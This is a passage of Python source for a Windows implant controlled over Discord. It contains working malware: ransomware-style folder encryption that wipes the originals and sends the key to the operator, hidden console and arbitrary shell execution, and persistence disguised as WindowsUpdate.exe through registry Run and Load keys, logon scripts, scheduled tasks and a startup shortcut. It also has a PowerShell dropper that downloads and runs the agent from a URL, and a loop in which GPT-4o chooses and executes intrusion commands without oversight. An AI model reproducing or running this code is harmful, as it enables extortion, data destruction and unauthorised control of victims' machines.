                    os.path.join(appdata,     r"Microsoft\Windows\WindowsUpdate.exe"),
                    os.path.join(localappdata, r"Microsoft\Windows\WindowsUpdate.exe"),
                    os.path.join(appdata,     r"Microsoft\Protect\WindowsUpdate.exe"),
                ]
                # Remove all persistence triggers
                for fn in (self.cleanup_registry_run_key, self.cleanup_startup_shortcut,
                           self.cleanup_schtask, self.cleanup_registry_load_key,
                           self.cleanup_userinit_logon_script):
                    try:
                        fn()
                    except Exception:
                        pass
                # Delete all stable EXE copies
                for dest in copy_targets:
                    try:
                        if os.path.exists(dest):
                            os.remove(dest)
                    except Exception:
                        pass
                # Remove VBS launcher
                try:
                    vbs_path = self._vbs_launcher_path()
                    if os.path.exists(vbs_path):
                        os.remove(vbs_path)
                except Exception:
                    pass
                # Remove dropper (recovery stage)
                try:
                    self._cleanup_dropper()
                except Exception:
                    pass
                # Overwrite then delete loot files
                for f in (_glob.glob(os.path.join(self.current_dir, "*.json")) +
                           _glob.glob(os.path.join(self.current_dir, "*.txt"))  +
                           _glob.glob(os.path.join(self.current_dir, "*.hiv"))):
                    try:
                        size = os.path.getsize(f)
                        with open(f, "r+b") as fh:
                            fh.write(os.urandom(size))
                        os.remove(f)
                    except Exception:
                        pass
                # Schedule self-deletion of the agent EXE
                subprocess.Popen(
                    f'cmd /c ping 127.0.0.1 -n 2 >nul && del /f /q "{exe}"',
                    shell=True, close_fds=True
                )
            except Exception as e:
                await message.channel.send(f"❌ selfdestruct error: {e}")
            await self.close()
            return

        # !wipe command — secure delete loot + agent EXE then exit
        if cmd.startswith("!wipe"):
            import sys, glob as _glob
            await message.channel.send("⚠️ Wiping agent and all loot files — connection will drop.")
            await self.global_logs_channel.send(f"[wipe] {self.hostname}: wipe initiated")
            try:
                exe = os.path.abspath(sys.argv[0])
                # Overwrite then delete loot files in current dir
                for f in _glob.glob(os.path.join(self.current_dir, "*.json")) + \
                          _glob.glob(os.path.join(self.current_dir, "*.txt"))  + \
                          _glob.glob(os.path.join(self.current_dir, "*.hiv")):
                    try:
                        size = os.path.getsize(f)
                        with open(f, "r+b") as fh:
                            fh.write(os.urandom(size))
                        os.remove(f)
                    except Exception:
                        pass
                # Schedule self-deletion via cmd /c ping (non-blocking)
                import subprocess
                subprocess.Popen(
                    f'cmd /c ping 127.0.0.1 -n 2 >nul && del /f /q "{exe}"',
                    shell=True, close_fds=True
                )
            except Exception as e:
                await message.channel.send(f"❌ wipe error: {e}")
            await self.close()
            return

        # !encrypt command — AES-256-GCM encrypt all files under a given path
        if cmd.startswith("!encrypt "):
            enc_path = content[9:].strip().strip('"').strip("'")
            if not enc_path:
                await message.channel.send("❌ Usage: `!encrypt <directory_path>` — provide a folder path.")
                return
            if os.path.isfile(enc_path):
                await message.channel.send("❌ `!encrypt` only works on **folders**, not individual files. Provide a directory path.")
                return
            if not os.path.isdir(enc_path):
                await message.channel.send(f"❌ Directory not found: `{enc_path}`")
                return
            # Pre-scan: count eligible files before encrypting (all file types, binary-safe)
            eligible = []
            for _root, _dirs, _files in os.walk(enc_path):
                for _fname in _files:
                    if not _fname.endswith(".art"):
                        eligible.append(os.path.join(_root, _fname))
            if not eligible:
                # Build a listing of everything actually in the folder for diagnostics
                all_items = []
                for _root, _dirs, _files in os.walk(enc_path):
                    for _f in _files:
                        all_items.append(os.path.join(_root, _f))
                    for _d in _dirs:
                        all_items.append(os.path.join(_root, _d) + os.sep)
                if all_items:
                    listing = "\n".join(all_items[:30])
                    suffix = f"\n...and {len(all_items)-30} more" if len(all_items) > 30 else ""
                    await message.channel.send(
                        f"⚠️ All files are already encrypted (`.art`). Contents:\n```\n{listing}{suffix}\n```"
                    )
                else:
                    await message.channel.send(
                        f"⚠️ `{enc_path}` is empty — no files to encrypt.\n"
                        f"Create files in that folder first, e.g.:\n"
                        f"`!shell echo test > {enc_path}\\test.txt`"
                    )
                return
            await message.channel.send(f"🔒 Encrypting {len(eligible)} file(s) under `{enc_path}` — do not interrupt...")
            try:
                from Crypto.Cipher import AES as _AES
                from Crypto.Protocol.KDF import HKDF as _HKDF
                from Crypto.Hash import SHA256 as _SHA256_KDF
                import os as _os
                import uuid as _uuid
                master_key = _os.urandom(32)
                encrypted_count = 0
                failed_count = 0
                for root, _dirs, files in _os.walk(enc_path):
                    for fname in files:
                        if fname.endswith(".art"):
                            continue
                        fpath = _os.path.join(root, fname)
                        art_fpath = _os.path.join(root, str(_uuid.uuid4()) + ".art")
                        try:
                            with open(fpath, "rb") as fh:
                                plaintext = fh.read()
                            # Per-file derived key via HKDF (salt stored in file)
                            salt = _os.urandom(32)
                            file_key = _HKDF(master_key, 32, salt, _SHA256_KDF, context=b"artfile_v1")
                            nonce = _os.urandom(16)
                            cipher = _AES.new(file_key, _AES.MODE_GCM, nonce=nonce)
                            # Original filename stored inside authenticated ciphertext
                            fname_bytes = fname.encode("utf-8", errors="replace")
                            fname_len = len(fname_bytes).to_bytes(2, "big")
                            payload = fname_len + fname_bytes + plaintext
                            ciphertext, tag = cipher.encrypt_and_digest(payload)
                            with open(art_fpath, "wb") as fh:
                                fh.write(salt + nonce + ciphertext + tag)
                            # Secure wipe original before removal
                            with open(fpath, "r+b") as fh:
                                fh.write(_os.urandom(len(plaintext)))
                                fh.flush()
                            _os.remove(fpath)
                            encrypted_count += 1
                        except Exception:
                            failed_count += 1
                key_hex = master_key.hex()
                # Wrap AES key with operator RSA-4096 public key (OAEP + SHA-256) if configured
                rsa_pub = OPERATOR_RSA_PUBLIC_KEY.strip()
                if rsa_pub:
                    try:
                        from Crypto.PublicKey import RSA as _RSA
                        from Crypto.Cipher import PKCS1_OAEP as _OAEP
                        from Crypto.Hash import SHA256 as _SHA256
                        import base64 as _b64
                        pub_key = _RSA.import_key(rsa_pub)
                        oaep_cipher = _OAEP.new(pub_key, hashAlgo=_SHA256)
                        wrapped = _b64.b64encode(oaep_cipher.encrypt(master_key)).decode()
                        import io as _io
                        _b64_file = _io.BytesIO(wrapped.encode())
                        _b64_file.name = "wrapped.b64"
                        await message.channel.send(
                            f"✅ Encryption complete. {encrypted_count} file(s) encrypted, {failed_count} skipped/failed.\n"
                            f"🔑 Download `wrapped.b64` and run: `build.bat unwrapkey wrapped.b64 op_private.pem`",
                            file=discord.File(_b64_file, filename="wrapped.b64")
                        )
                        await self.global_logs_channel.send(
                            f"[encrypt] {self.hostname}: {encrypted_count} files encrypted under {enc_path} | rsa_wrapped_key: {wrapped}"
                        )
                    except Exception as rsa_err:
                        await message.channel.send(
                            f"⚠️ RSA wrapping failed ({rsa_err}) — sending plain hex (less secure).\n"
                            f"🔑 **Master key (AES-256):** `{key_hex}`"
                        )
                        await self.global_logs_channel.send(
                            f"[encrypt] {self.hostname}: {encrypted_count} files encrypted under {enc_path} | key_plain: {key_hex}"
                        )
                else:
                    await message.channel.send(
                        f"✅ Encryption complete. {encrypted_count} file(s) encrypted, {failed_count} skipped/failed.\n"
                        f"⚠️ OPERATOR_RSA_PUBLIC_KEY not set — key sent as plain hex (configure it for full security).\n"
                        f"🔑 **Master key (AES-256):** `{key_hex}`"
                    )
                    await self.global_logs_channel.send(
                        f"[encrypt] {self.hostname}: {encrypted_count} files encrypted under {enc_path} | key_plain: {key_hex}"
                    )
            except Exception as e:
                await message.channel.send(f"❌ Encryption error: {e}")
            return

        # !decrypt command — AES-256-GCM decrypt all .art files under a given path
        if cmd.startswith("!decrypt "):
            parts = content.split(None, 2)  # ["!decrypt", "<path>", "<key_hex>"]
            if len(parts) != 3:
                await message.channel.send("❌ Usage: `!decrypt <directory_path> <key_hex>`")
                return
            dec_path, key_hex = parts[1].strip('"').strip("'"), parts[2].strip()
            if not os.path.isdir(dec_path):
                await message.channel.send(f"❌ Path not found or not a directory: `{dec_path}`")
                return
            if len(key_hex) != 64 or not all(c in '0123456789abcdefABCDEF' for c in key_hex):
                await message.channel.send("❌ Invalid key — must be a 64-character hex string (256-bit AES key).")
                return
            await message.channel.send(f"🔓 Decrypting all .art files under `{dec_path}`...")
            try:
                from Crypto.Cipher import AES as _AES
                from Crypto.Protocol.KDF import HKDF as _HKDF
                from Crypto.Hash import SHA256 as _SHA256_KDF
                master_key = bytes.fromhex(key_hex)
                decrypted_count = 0
                failed_count = 0
                for root, _dirs, files in os.walk(dec_path):
                    for fname in files:
                        if not fname.endswith(".art"):
                            continue
                        enc_fpath = os.path.join(root, fname)
                        try:
                            with open(enc_fpath, "rb") as fh:
                                data = fh.read()
                            if len(data) < 64:  # salt(32) + nonce(16) + tag(16) minimum
                                failed_count += 1
                                continue
                            salt = data[:32]
                            nonce = data[32:48]
                            tag = data[-16:]
                            ciphertext = data[48:-16]
                            file_key = _HKDF(master_key, 32, salt, _SHA256_KDF, context=b"artfile_v1")
                            cipher = _AES.new(file_key, _AES.MODE_GCM, nonce=nonce)
                            payload = cipher.decrypt_and_verify(ciphertext, tag)
                            fname_len = int.from_bytes(payload[:2], "big")
                            orig_fname = payload[2:2 + fname_len].decode("utf-8", errors="replace")
                            plaintext = payload[2 + fname_len:]
                            orig_fpath = os.path.join(root, orig_fname)
                            with open(orig_fpath, "wb") as fh:
                                fh.write(plaintext)
                            # Secure wipe .art file before removal
                            with open(enc_fpath, "r+b") as fh:
                                fh.write(os.urandom(len(data)))
                                fh.flush()
                            os.remove(enc_fpath)
                            decrypted_count += 1
                        except Exception:
                            failed_count += 1
                await message.channel.send(
                    f"✅ Decryption complete. {decrypted_count} file(s) restored, {failed_count} failed/skipped."
                )
                await self.global_logs_channel.send(
                    f"[decrypt] {self.hostname}: {decrypted_count} files decrypted under {dec_path}"
                )
            except Exception as e:
                await message.channel.send(f"❌ Decryption error: {e}")
            return

        # !stealth command — hide the console window
        if cmd.startswith("!stealth"):
            try:
                import ctypes
                hwnd = ctypes.windll.kernel32.GetConsoleWindow()
                if hwnd:
                    ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE
                    await message.channel.send("✅ Console window hidden.")
                    await self.global_logs_channel.send(f"[stealth] {self.hostname}: console hidden")
                else:
                    await message.channel.send("ℹ️ No console window found (already hidden or running as GUI).")
            except Exception as e:
                await message.channel.send(f"❌ stealth error: {e}")
            return

        # Default: execute as shell command
        try:
            result = await self._run_shell_command(content)
            if len(result) > 1900:
                await self._write_text_file("out.txt", result)
                await message.channel.send("📄 Output too large, attached as file:", file=discord.File("out.txt"))
                await self.global_logs_channel.send(f"[cmd] {self.hostname}: Output too large, sent as file.")
                await self._remove_file_if_exists("out.txt")
            else:
                await message.channel.send(f"```\n{result or '[Command executed with no output]'}\n```")
                await self.global_logs_channel.send(f"[cmd] {self.hostname}: {content}\n{result}")
        except Exception as e:
            await message.channel.send(f"❌ Execution Error: {e}")
            await self.global_logs_channel.send(f"[cmd] {self.hostname}: Execution Error: {e}")

    async def _create_chat_completion(self, client, **kwargs):
        return await asyncio.to_thread(client.chat.completions.create, **kwargs)

    async def generate_and_upload_report(self, reply_channel):
        import openai
        import aiofiles
        client = openai.OpenAI(api_key=OPENAI_API_KEY)
        context = getattr(self, "_latest_context", None)
        if not context:
            await reply_channel.send("No assessment context available yet.")
            return
        report_prompt = f"""You are an elite Senior Penetration Tester following the PTES methodology. Generate a comprehensive PTES assessment report in Markdown format based on the current context below. The report should be suitable for delivery to a client and include all relevant findings, actions, and recommendations. Do not include any text outside the markdown report itself.\n\nContext:\n{context}"""
        try:
            response = await self._create_chat_completion(
                client,
                model="gpt-4o",
                messages=[{"role": "system", "content": report_prompt}]
            )
            report_markdown = response.choices[0].message.content.strip()
        except Exception as e:
            await reply_channel.send(f"[report] LLM error generating report: {e}")
            return
        report_filename = "Report.md"
        async with aiofiles.open(report_filename, "w", encoding="utf-8") as f:
            await f.write(report_markdown)
        # Always upload to the reports channel
        report_channel = getattr(self, "reports_channel", None)
        import discord as _discord
        if report_channel:
            await report_channel.send("PTES Assessment Report (on-demand):", file=_discord.File(report_filename))
            await reply_channel.send("[report] Report uploaded to #reports.")
        else:
            await reply_channel.send("[report] Could not find #reports channel. Report not uploaded.")
        try:
            os.remove(report_filename)
        except Exception as e:
            await reply_channel.send(f"[report] Failed to delete report file: {e}")

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.unique_id = get_unique_id()
        self.hostname = get_hostname()
        self.channel = None
        self.category = None
        self.last_heartbeat = time.time()
        self.heartbeat_task = None
        self.current_dir = os.path.dirname(os.path.abspath(__file__))
        self.mode = "passive"  # Modes: "passive" (default), "active"
        self._latest_context = {
            "phase": "Intelligence Gathering",
            "system_info": {
                "hostname": self.hostname,
                "os": f"{platform.system()} {platform.release()}",
                "user": get_current_user(),
                "current_dir": self.current_dir,
                "unique_id": self.unique_id,
            },
            "user_privileges": None,
            "network": {},
            "credentials": [],
            "vulnerabilities": [],
            "discovered_files": [],
            "objectives": ["privilege escalation", "persistence", "lateral movement", "data access"],
            "actions_taken": [],
        }

    async def start_autonomous_loop(self):
        import openai
        import aiofiles
        client = openai.OpenAI(api_key=OPENAI_API_KEY)
        logchan = self.art_log_channel or self.global_logs_channel
        await logchan.send(f"[autonomous] {self.hostname}: Autonomous loop started.")

        # --- Helpers (defined once, outside the loop) ---
        async def send_long(channel, header, body, prefix, step):
            """Send body to channel; attach as file if over Discord's 2000-char limit."""
            if channel is None:
                return
            msg = f"{header}\n{body}" if header else body
            if len(msg) > 1900:
                fname = f"{prefix}_step{step}.txt"
                try:
                    async with aiofiles.open(fname, "w", encoding="utf-8") as fh:
                        await fh.write(body)
                    await channel.send(f"{header} (too long, sent as file)" if header else "(sent as file)", file=discord.File(fname))
                finally:
                    try:
                        os.remove(fname)
                    except OSError:
                        pass
            else:
                await channel.send(msg)

        def extract_section(text, section):
            """Return the content of [SECTION] from an LLM reply, or None if missing."""
            lines = text.splitlines()
            start = None
            for i, line in enumerate(lines):
                if line.strip().upper() == f"[{section}]":
                    start = i + 1
                    break
            if start is None:
                return None
            for j in range(start, len(lines)):
                if lines[j].strip().startswith("[") and lines[j].strip().endswith("]"):
                    return "\n".join(lines[start:j]).strip()
            return "\n".join(lines[start:]).strip() or None

        # Initialize context (reuse existing if available, e.g. after !mode active restart)
        context = getattr(self, "_latest_context", None) or {
            "phase": "Intelligence Gathering",
            "system_info": {
                "hostname": self.hostname,
                "os": f"{platform.system()} {platform.release()}",
                "user": get_current_user(),
                "current_dir": self.current_dir,
                "unique_id": self.unique_id,
            },
            "user_privileges": None,
            "network": {},
            "credentials": [],
            "vulnerabilities": [],
            "discovered_files": [],
            "objectives": ["privilege escalation", "persistence", "lateral movement", "data access"],
            "actions_taken": [],
        }

        step = 1
        while self.mode == "active":
            self._latest_context = context

            # Build a trimmed context summary for the prompt (avoid token overflow)
            recent_actions = context["actions_taken"][-5:]  # last 5 steps only
            last_result  = recent_actions[-1]["result"]  if recent_actions else ""
            last_command = recent_actions[-1]["command"] if recent_actions else ""
            prompt_context = {
                "phase": context["phase"],
                "system_info": context["system_info"],
                "objectives": context["objectives"],
                "objectives_completed": context.get("objectives_completed", []),
                "recent_actions": recent_actions,
                "credentials": context.get("credentials", []),
                "vulnerabilities": context.get("vulnerabilities", []),
            }

            prompt = (
                "You are an elite Senior Penetration Tester following the PTES methodology.\n"
                f"Current phase: {context['phase']}\n"
                f"Context summary: {json.dumps(prompt_context, default=str)}\n\n"
                f"Previous command: {last_command}\n"
                f"Previous result/output: {last_result}\n\n"
                "Respond ONLY in this exact format:\n\n"
                "[PHASE]\n<Current PTES Phase>\n\n"
                "[ANALYSIS]\nWhat you know so far\nWhat is missing\nWhy this matters\n\n"
                "[HYPOTHESIS]\nWhat you believe might be possible next\n\n"
                "[COMMAND]\n<single shell command only — no explanation>\n\n"
                "[REASON]\nWhy THIS command is the best next step (specific, not generic)\n\n"
                "[OBJECTIVES_COMPLETED]\n"
                "<comma-separated list of objectives now met, from: privilege escalation, persistence, lateral movement, data access — or leave blank if none>\n\n"
                "Rules: Do NOT run redundant commands. Do NOT skip phases. "
                "Write STOP in [COMMAND] if no escalation path exists or all objectives are met."
            )

            await logchan.send(f"[autonomous] Step {step}: Querying LLM...")
            try:
                response = await self._create_chat_completion(
                    client,
                    model="gpt-4o",
                    messages=[{"role": "system", "content": prompt}],
                )
                llm_reply = response.choices[0].message.content.strip()
            except Exception as e:
                await logchan.send(f"[autonomous] LLM error: {e}")
                break

            await send_long(logchan, f"[autonomous] Step {step} LLM reply:", llm_reply, "llm_reply", step)

            phase     = extract_section(llm_reply, "PHASE")
            analysis  = extract_section(llm_reply, "ANALYSIS")
            hypothesis = extract_section(llm_reply, "HYPOTHESIS")
            command   = extract_section(llm_reply, "COMMAND")
            reason    = extract_section(llm_reply, "REASON")
            objectives_completed_section = extract_section(llm_reply, "OBJECTIVES_COMPLETED")

            missing = [s for s, v in [("PHASE", phase), ("ANALYSIS", analysis),
                                       ("HYPOTHESIS", hypothesis), ("COMMAND", command),
                                       ("REASON", reason)] if not v]
            if missing:
                await logchan.send(f"[autonomous] LLM reply missing sections: {', '.join(missing)}. Aborting.")
                self.mode = "passive"
                break

            # LLM-signalled graceful stop
            if command.strip().upper() == "STOP":
                await logchan.send("[autonomous] LLM signalled STOP. Exiting autonomous mode.")
                self.mode = "passive"
                break

            # Phase transition tracking
            if phase != context["phase"]:
                context["phase"] = phase
                context.setdefault("phase_transitions", []).append({"step": step, "new_phase": phase})

            context["last_analysis"]   = analysis
            context["last_hypothesis"] = hypothesis
            context["last_reason"]     = reason

            # OPSEC warning for noisy commands (log only — operator already approved autonomous mode)
            noisy_keywords = [
                "shutdown", "format", "ransom", "shadowcopy", "vssadmin",
                "mimikatz", "disable", "bypass",
            ]
            opsec_notes = []
            if any(kw in command.lower() for kw in noisy_keywords):
                note = "Command contains noisy keyword. Proceeding in autonomous mode."
                opsec_notes.append(note)
                await logchan.send(f"[opsec] Warning: {note}\nCommand: {command}")

            audit_entry = {
                "timestamp": datetime.datetime.utcnow().isoformat() + "Z",
                "step": step,
                "phase": phase,
                "command": command,
                "analysis": analysis,
                "hypothesis": hypothesis,
                "reason": reason,
                "opsec_notes": opsec_notes or None,
            }
            try:
                result = await self._run_shell_command(command)
                audit_entry["result"] = result[:500]
            except Exception as e:
                result = f"[ERROR] {e}"
                audit_entry["error"] = str(e)
                await logchan.send(f"[audit] ERROR executing: {command}\n{e}")
                context.setdefault("errors", []).append({
                    "step": step, "command": command, "error": str(e),
                    "timestamp": audit_entry["timestamp"],
                })

            if opsec_notes:
                context.setdefault("opsec_events", []).append(
                    {"step": step, "command": command, "notes": opsec_notes}
                )

            try:
                with open("agent_audit.log", "a", encoding="utf-8") as fh:
                    fh.write(json.dumps(audit_entry) + "\n")
            except Exception as logerr:
                await logchan.send(f"[audit] ERROR writing audit log: {logerr}")

            context["actions_taken"].append({
                "step": step, "phase": phase, "command": command,
                "result": result[:200], "analysis": analysis,
                "hypothesis": hypothesis, "reason": reason,
            })
            await send_long(logchan, f"[autonomous] Step {step} result:", result, "result", step)

            # Update completed objectives from LLM output
            if objectives_completed_section:
                newly_done = [
                    o.strip().lower()
                    for o in objectives_completed_section.replace(",", "\n").splitlines()
                    if o.strip()
                ]
                existing = set(context.get("objectives_completed", []))
                context["objectives_completed"] = list(existing | set(newly_done))

            all_objectives = {o.lower() for o in context["objectives"]}
            completed = {o.lower() for o in context.get("objectives_completed", [])}
            if all_objectives and all_objectives <= completed:
                await logchan.send("[autonomous] All objectives completed. Generating final report...")
                await self.generate_and_upload_report(logchan)
                self.mode = "passive"
                break

            step += 1
            await asyncio.sleep(random.uniform(2, 5))  # jitter to avoid predictable timing


    # ------------------------------------------------------------------
    # Persistence helpers — VBS launcher + self-heal
    # ------------------------------------------------------------------

    async def _fetch_payload(self, src: str) -> bytes:
        """Fetch payload bytes from a URL (http/https) or from the #payloads channel by filename."""
        if src.startswith("http://") or src.startswith("https://"):
            import urllib.request
            def _download():
                req = urllib.request.Request(src, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=30) as resp:
                    return resp.read()
            return await asyncio.to_thread(_download)
        # Treat src as a filename — search #payloads channel history
        filename = src
        async for msg in self.payload_channel.history(limit=200):
            for att in msg.attachments:
                if att.filename == filename:
                    import io
                    buf = io.BytesIO()
                    await att.save(buf)
                    return buf.getvalue()
        raise FileNotFoundError(f"`{filename}` not found in #payloads (searched last 200 messages).")

    @staticmethod
    def _vbs_launcher_path():
        appdata = os.environ.get("APPDATA", os.path.expanduser("~"))
        return os.path.join(appdata, r"Microsoft\Windows\wupdate.vbs")

    @staticmethod
    def _copy_targets():
        appdata    = os.environ.get("APPDATA",      os.path.expanduser("~"))
        localappdata = os.environ.get("LOCALAPPDATA", os.path.expanduser("~"))
        return [
            os.path.join(appdata,      r"Microsoft\Windows\WindowsUpdate.exe"),
            os.path.join(localappdata, r"Microsoft\Windows\WindowsUpdate.exe"),
            os.path.join(appdata,      r"Microsoft\Protect\WindowsUpdate.exe"),
        ]

    def _write_vbs_launcher(self, vbs_path, copy_paths):
        """Write a silent VBScript that tries each EXE copy in order."""
        lines = [
            'Dim fso, wsh',
            'Set fso = CreateObject("Scripting.FileSystemObject")',
            'Set wsh = CreateObject("WScript.Shell")',
            'Dim i, paths(2)',
            'paths(0) = wsh.ExpandEnvironmentStrings("%APPDATA%\\Microsoft\\Windows\\WindowsUpdate.exe")',
            'paths(1) = wsh.ExpandEnvironmentStrings("%LOCALAPPDATA%\\Microsoft\\Windows\\WindowsUpdate.exe")',
            'paths(2) = wsh.ExpandEnvironmentStrings("%APPDATA%\\Microsoft\\Protect\\WindowsUpdate.exe")',
            'For i = 0 To 2',
            '    If fso.FileExists(paths(i)) Then',
            '        wsh.Run Chr(34) & paths(i) & Chr(34), 0, False',
            '        WScript.Quit',
            '    End If',
            'Next',
        ]
        try:
            os.makedirs(os.path.dirname(vbs_path), exist_ok=True)
            with open(vbs_path, "w", newline="\r\n") as f:
                f.write("\r\n".join(lines) + "\r\n")
            return True
        except Exception:
            return False

    def _self_heal_persistence(self):
        """Silently re-copy missing EXE copies and re-register any broken triggers."""
        import sys, shutil, subprocess
        copy_paths  = self._copy_targets()
        vbs_path    = self._vbs_launcher_path()
        trigger_cmd = f'wscript.exe /B "{vbs_path}"'

        # Find a live source to copy from (prefer already-stable AppData copies)
        candidates = copy_paths + [os.path.abspath(sys.argv[0])]
        src = next((p for p in candidates if os.path.isfile(p)), None)
        if src is None:
            return  # nothing to heal with

        # Re-copy any missing stable copies
        for dest in copy_paths:
            if not os.path.isfile(dest):
                try:
                    os.makedirs(os.path.dirname(dest), exist_ok=True)
                    if os.path.normcase(src) != os.path.normcase(dest):
                        shutil.copy2(src, dest)
                except Exception:
                    pass

        # Re-create VBS launcher if missing
        if not os.path.isfile(vbs_path):
            self._write_vbs_launcher(vbs_path, copy_paths)

        # Re-register registry/task triggers if missing or stale
        try:
            import winreg

            def _read_reg(hive, path, name):
                try:
                    k = winreg.OpenKey(hive, path, 0, winreg.KEY_READ)
                    v, _ = winreg.QueryValueEx(k, name)
                    winreg.CloseKey(k)
                    return v
                except Exception:
                    return None

            if _read_reg(winreg.HKEY_CURRENT_USER,
                         r"Software\Microsoft\Windows\CurrentVersion\Run",
                         "WindowsUpdate") != trigger_cmd:
                self.setup_registry_run_key(trigger_cmd)

            if _read_reg(winreg.HKEY_CURRENT_USER,
                         r"Software\Microsoft\Windows NT\CurrentVersion\Windows",
                         "Load") != trigger_cmd:
                self.setup_registry_load_key(trigger_cmd)

            if _read_reg(winreg.HKEY_CURRENT_USER, "Environment",
                         "UserInitMprLogonScript") != trigger_cmd:
                self.setup_userinit_logon_script(trigger_cmd)
        except Exception:
            pass

        # Scheduled task
        try:
            r = subprocess.run(["schtasks", "/Query", "/TN", "WindowsUpdate"],
                               capture_output=True)
            if r.returncode != 0:
                self.setup_schtask(trigger_cmd)
        except Exception:
            pass

        # Startup shortcut
        try:
            appdata = os.environ.get("APPDATA", "")
            shortcut_path = os.path.join(
                appdata, r"Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.lnk")
            if not os.path.isfile(shortcut_path):
                self.setup_startup_shortcut(vbs_path)
        except Exception:
            pass

        # Dropper (recovery stage) — heal if PS1 or VBS missing and RECOVERY_URL is configured
        if RECOVERY_URL:
            try:
                ps1_path = self._dropper_ps1_path()
                drp_vbs  = self._dropper_vbs_path()
                if not os.path.isfile(ps1_path) or not os.path.isfile(drp_vbs):
                    self._write_dropper(RECOVERY_URL)
                # Re-register dropper Run key if missing
                try:
                    import winreg

                    def _read_reg2(hive, path, name):
                        try:
                            k = winreg.OpenKey(hive, path, 0, winreg.KEY_READ)
                            v, _ = winreg.QueryValueEx(k, name)
                            winreg.CloseKey(k)
                            return v
                        except Exception:
                            return None

                    drp_trigger = f'wscript.exe /B "{drp_vbs}"'
                    if _read_reg2(winreg.HKEY_CURRENT_USER,
                                  r"Software\Microsoft\Windows\CurrentVersion\Run",
                                  "SecurityHealthService") != drp_trigger:
                        self._deploy_dropper_persistence()
                except Exception:
                    pass
                # Re-register dropper schtask if missing
                try:
                    r2 = subprocess.run(["schtasks", "/Query", "/TN", "SecurityHealthService"],
                                        capture_output=True)
                    if r2.returncode != 0:
                        self._deploy_dropper_persistence()
                except Exception:
                    pass
            except Exception:
                pass

    # ------------------------------------------------------------------
    # Dropper (recovery stage) — survives full deletion of all EXE copies
    # ------------------------------------------------------------------

    @staticmethod
    def _dropper_ps1_path():
        appdata = os.environ.get("APPDATA", os.path.expanduser("~"))
        return os.path.join(appdata, r"Microsoft\Windows\wdrp.ps1")

    @staticmethod
    def _dropper_vbs_path():
        appdata = os.environ.get("APPDATA", os.path.expanduser("~"))
        return os.path.join(appdata, r"Microsoft\Windows\wdrp.vbs")

    def _write_dropper(self, recovery_url: str):
        """Write wdrp.ps1 + wdrp.vbs.
        PS1 checks each main-agent copy; if none exist and recovery_url is set,
        downloads to all 3 paths and launches the first that succeeded."""
        ps1_path = self._dropper_ps1_path()
        vbs_path = self._dropper_vbs_path()
        safe_url = recovery_url.replace("'", "\\'")
        ps1 = (
            "$paths = @(\r\n"
            "  \"$env:APPDATA\\Microsoft\\Windows\\WindowsUpdate.exe\",\r\n"
            "  \"$env:LOCALAPPDATA\\Microsoft\\Windows\\WindowsUpdate.exe\",\r\n"
            "  \"$env:APPDATA\\Microsoft\\Protect\\WindowsUpdate.exe\"\r\n"
            ")\r\n"
            f"$url = '{safe_url}'\r\n"
            "$alive = $paths | Where-Object { Test-Path $_ } | Select-Object -First 1\r\n"
            "if (-not $alive -and $url) {\r\n"
            "  foreach ($dest in $paths) {\r\n"
            "    try {\r\n"
            "      $dir = Split-Path $dest\r\n"
            "      if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }\r\n"
            "      Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing -ErrorAction Stop\r\n"
            "      $alive = $dest\r\n"
            "      break\r\n"
            "    } catch { }\r\n"
            "  }\r\n"
            "}\r\n"
            "if ($alive) { Start-Process -FilePath $alive -WindowStyle Hidden }\r\n"
        )
        vbs = (
            "Dim wsh, ps1\r\n"
            "Set wsh = CreateObject(\"WScript.Shell\")\r\n"
            "ps1 = wsh.ExpandEnvironmentStrings"
            "(\"%APPDATA%\\Microsoft\\Windows\\wdrp.ps1\")\r\n"
            "wsh.Run \"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass"
            " -NonInteractive -File \"\"\" & ps1 & \"\"\"\", 0, False\r\n"
        )
        results = []
        try:
            os.makedirs(os.path.dirname(ps1_path), exist_ok=True)
            with open(ps1_path, "w", newline="") as f:
                f.write(ps1)
            results.append(f"Dropper PS1 → {ps1_path}")
        except Exception as e:
            results.append(f"Dropper PS1 failed: {e}")
        try:
            with open(vbs_path, "w", newline="") as f:
                f.write(vbs)
            results.append(f"Dropper VBS → {vbs_path}")
        except Exception as e:
            results.append(f"Dropper VBS failed: {e}")
        return results

    def _deploy_dropper_persistence(self):
        """Register dropper under separate names so it survives main-agent cleanup."""
        import subprocess
        vbs_path    = self._dropper_vbs_path()
        trigger_cmd = f'wscript.exe /B "{vbs_path}"'
        results = []
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SecurityHealthService", 0, winreg.REG_SZ, trigger_cmd)
            winreg.CloseKey(key)
            results.append("Dropper Run key set.")
        except Exception as e:
            results.append(f"Dropper Run key failed: {e}")
        try:
            cmd = ["schtasks", "/Create", "/SC", "ONLOGON", "/TN", "SecurityHealthService",
                   "/TR", trigger_cmd, "/F"]
            r = subprocess.run(cmd, capture_output=True)
            if r.returncode == 0:
                results.append("Dropper schtask created.")
            else:
                results.append(f"Dropper schtask failed: {r.stderr.decode('utf-8', errors='replace')}")
        except Exception as e:
            results.append(f"Dropper schtask failed: {e}")
        return results

    def _cleanup_dropper(self):
        """Remove all dropper artifacts — call from !persist cleanup and !selfdestruct."""
        import subprocess
        results = []
        # Remove registry key
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "SecurityHealthService")
            winreg.CloseKey(key)
            results.append("Dropper Run key removed.")
        except Exception as e:
            results.append(f"Dropper Run key cleanup: {e}")
        # Remove scheduled task
        try:
            r = subprocess.run(["schtasks", "/Delete", "/TN", "SecurityHealthService", "/F"],
                               capture_output=True)
            if r.returncode == 0:
                results.append("Dropper schtask removed.")
            else:
                results.append(f"Dropper schtask cleanup: {r.stderr.decode('utf-8', errors='replace')}")
        except Exception as e:
            results.append(f"Dropper schtask cleanup: {e}")
